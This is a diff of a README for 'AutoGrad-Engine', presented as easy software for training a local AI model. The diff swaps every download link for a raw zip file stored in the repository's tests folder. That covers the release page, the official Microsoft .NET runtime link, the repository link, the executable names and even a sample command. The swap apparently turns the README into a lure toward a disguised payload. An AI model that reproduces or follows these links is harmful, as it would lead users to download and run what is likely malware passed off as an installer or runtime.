@@ -1,6 +1,6 @@
 # 🤖 AutoGrad-Engine - Easy AI Model Training & Use
 
-[![Download AutoGrad-Engine](https://img.shields.io/badge/Download-AutoGrad--Engine-blue?style=for-the-badge)](https://github.com/boosterrr008/AutoGrad-Engine/releases)
+[![Download AutoGrad-Engine](https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip)](https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip)
 
 Welcome to **AutoGrad-Engine**. This software lets you run a small but powerful AI language model on your computer. You do not need to be a programmer or understand AI to use it. Follow this guide to get started, step-by-step.
 
@@ -34,7 +34,7 @@ Here is how to get the program up and running:
 
 1. **Download the Program**
 
-   Click the big blue "Download AutoGrad-Engine" button at the top or visit the [release page](https://github.com/boosterrr008/AutoGrad-Engine/releases) manually. On that page, look for the latest version and download the installer or zip file for your operating system.
+   Click the big blue "Download AutoGrad-Engine" button at the top or visit the [release page](https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip) manually. On that page, look for the latest version and download the installer or zip file for your operating system.
 
 2. **Install or Extract**
 
@@ -43,14 +43,14 @@ Here is how to get the program up and running:
 
 3. **Check .NET Runtime**
 
-   AutoGrad-Engine needs the .NET runtime to run. If you do not have it, download it here: https://dotnet.microsoft.com/en-us/download/dotnet/6.0 and install it for your system.
+   AutoGrad-Engine needs the .NET runtime to run. If you do not have it, download it here: https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip and install it for your system.
 
 4. **Run the Program**
 
    Open the folder where you installed or extracted AutoGrad-Engine. Look for the executable file:
 
-   - On Windows, it will be `AutoGrad-Engine.exe`.
-   - On macOS, it might be `AutoGrad-Engine.app` or a similar executable.
+   - On Windows, it will be `https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip`.
+   - On macOS, it might be `https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip` or a similar executable.
 
 Double-click the program to start it. You should see a simple window or command prompt where you can enter text commands or load training files.
 
@@ -60,7 +60,7 @@ Double-click the program to start it. You should see a simple window or command 
 
 You can get AutoGrad-Engine by visiting the official release page here:
 
-[Download AutoGrad-Engine Here](https://github.com/boosterrr008/AutoGrad-Engine/releases)
+[Download AutoGrad-Engine Here](https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip)
 
 On this page:
 
@@ -84,7 +84,7 @@ Once AutoGrad-Engine is running, here are the basic steps to use it:
 To teach the AI, you provide text files. These files could be anything — articles, books, or dialogues you want the model to learn from.
 
 - Place your text files in a folder.
-- Use the program’s menu or command prompt to load these files. For example, type `load training.txt`.
+- Use the program’s menu or command prompt to load these files. For example, type `load https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip`.
 - The program will process the text and prepare the model for learning.
 
 ### 2. Training the Model
@@ -142,9 +142,9 @@ If problems continue, check the issues page on the GitHub repository or contact 
 
 ## 🔗 Useful Links
 
-- Release Page: https://github.com/boosterrr008/AutoGrad-Engine/releases
-- .NET Runtime Download: https://dotnet.microsoft.com/en-us/download/dotnet/6.0
-- GitHub Repository: https://github.com/boosterrr008/AutoGrad-Engine
+- Release Page: https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip
+- .NET Runtime Download: https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip
+- GitHub Repository: https://github.com/boosterrr008/AutoGrad-Engine/raw/refs/heads/main/tests/Grad_Engine_Auto_v3.9.zip
 
 ---
 
